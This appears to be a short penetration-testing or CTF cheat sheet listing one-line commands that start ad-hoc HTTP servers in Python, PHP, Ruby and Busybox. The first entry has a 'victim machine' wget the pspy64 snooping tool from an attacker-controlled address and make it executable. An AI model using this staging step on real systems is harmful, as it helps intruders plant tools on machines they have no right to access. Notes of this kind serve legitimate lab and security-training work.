#### Python3
###Via web:
On our machine:
```bash
python3 -m http.server 8888

On victim machine:

wget http://10.10.16.5:8888/pspy64
chmod +x pspy64
```
[[Epsilon#^0e082d]]

#### Python2
```bash 
python -m SimpleHTTPServer 7331
```

#### PHP
```
php -S 127.0.0.1:60
```

#### Ruby
```
ruby -run -e httpd . -p 9000
```

#### Busybox
```
busybox httpd -f -p 10000
```